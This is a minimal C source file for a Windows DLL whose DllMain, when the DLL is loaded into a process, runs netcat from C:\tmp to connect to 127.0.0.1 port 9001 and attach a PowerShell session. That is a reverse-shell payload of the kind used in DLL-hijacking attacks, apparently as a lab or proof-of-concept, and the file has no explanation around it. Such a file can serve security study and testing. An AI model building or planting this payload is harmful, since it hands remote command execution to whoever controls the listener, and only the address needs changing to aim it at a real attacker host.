#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
{
    switch(dwReason)
    {
        case DLL_PROCESS_ATTACH:
            WinExec("C:\\tmp\\nc.exe 127.0.0.1 9001 -e powershell", 0);
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
        	break;
        case DLL_THREAD_DETACH:
        	break;
    }
    return 0;
}

